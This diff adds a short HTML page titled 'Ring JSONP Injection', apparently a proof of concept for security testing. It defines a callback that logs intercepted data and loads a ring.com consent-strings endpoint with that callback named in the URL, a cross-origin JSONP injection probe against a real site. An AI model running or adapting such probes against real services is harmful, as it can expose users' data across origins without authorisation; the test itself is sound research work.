@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ring JSONP Injection</title>
+</head>
+<body>
+    <h1>Welcome</h1>
+    <p>Your content here</p>
+
+    <script>
+      function testJSONPInjection(data) {
+          console.log("Intercepted:", data);
+      }
+    </script>
+  
+  <script src="https://ring.com/partials/consent/fr-FR/strings.json?callback=testJSONPInjection"></script>
+</body>
+</html>
